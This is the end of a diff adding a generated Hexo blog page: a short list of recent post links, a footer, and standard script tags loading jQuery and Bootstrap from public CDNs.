+          <a href="/hw-1/2020/11/05/privacy-data-collection-and-storage-reject/">Privacy - Data Collection and Storage Reject</a>
+        </li>
+      
+        <li>
+          <a href="/hw-1/2020/11/04/sourcetree-set-git-repo-username-password/">sourceTree set git repo username password</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+
+        </div>
+    </div>
+  </div>
+  <footer class="blog-footer">
+  <div class="container">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+  
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js" integrity="sha384-8gBf6Y4YYq7Jx97PIqmTwLPin4hxIzQw5aDmUg/DDhul9fFpbbLcLh3nTIIDJKhx" crossorigin="anonymous"></script>
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/hw-1/js/script.js"></script>
+
+
+</body>
+</html>
